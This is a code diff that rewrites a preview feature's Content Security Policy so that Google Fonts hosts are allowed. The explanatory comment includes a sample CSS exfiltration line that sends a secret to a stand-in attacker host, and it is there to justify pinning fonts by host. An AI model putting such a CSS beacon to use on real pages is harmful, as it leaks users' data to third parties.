@@ -70,6 +70,37 @@ const REMOTE_DISPLAY_CSP = [
 
 const LOCAL_DISPLAY_CSP = ['img-src data: blob:', 'font-src data:', 'media-src data: blob:'];
 
+/// `document`'s directives, spelled out in full rather than composed from
+/// BASE_CSP + LOCAL_DISPLAY_CSP. CSP keeps only the FIRST occurrence of a
+/// directive and silently drops later duplicates, so `style-src` and
+/// `font-src` have to be widened where they are first stated — appending a
+/// second copy would have no effect at all.
+///
+/// The two Google font hosts are the one remote display channel this policy
+/// grants, and they are pinned by host for a specific reason. The blanket
+/// `https:` that REMOTE_DISPLAY_CSP allows is an exfiltration channel because
+/// the page picks the origin: `background: url(https://attacker/?d=secret)`
+/// puts the data in someone else's access log. Pinning to fonts.gstatic.com
+/// and fonts.googleapis.com removes exactly that — a page can still encode
+/// data into the URL, but only Google can read the result, and the page
+/// already gets `script-src https:` here, which is a far larger grant.
+///
+/// What this buys: a design canvas from `/design` declares its typefaces as a
+/// Google Fonts <link>. Without these two hosts every face silently falls
+/// back to a system font, which on a design mockup does not read as a missing
+/// feature — it reads as the design.
+const DOCUMENT_CSP = [
+  "default-src 'none'",
+  "frame-src 'none'",
+  "form-action 'none'",
+  "style-src 'unsafe-inline' https://fonts.googleapis.com",
+  'img-src data: blob:',
+  'font-src data: https://fonts.gstatic.com',
+  'media-src data: blob:',
+  "connect-src 'none'",
+  "script-src 'unsafe-inline' 'unsafe-eval' https:",
+];
+
 const CSP_BY_POLICY: Record<PreviewPolicy, string> = {
   // No script and no network at all: everything this document needs to render
   // is already inside it.
@@ -84,12 +115,7 @@ const CSP_BY_POLICY: Record<PreviewPolicy, string> = {
   // directives close every channel a document does NOT need in order to
   // render; they narrow this policy, they do not seal it. Treat `document`
   // as trusted-content-only, not as a sandbox for untrusted HTML.
-  document: [
-    ...BASE_CSP,
-    ...LOCAL_DISPLAY_CSP,
-    "connect-src 'none'",
-    "script-src 'unsafe-inline' 'unsafe-eval' https:",
-  ].join('; '),
+  document: DOCUMENT_CSP.join('; '),
 };
 
 interface PublishedDocument {
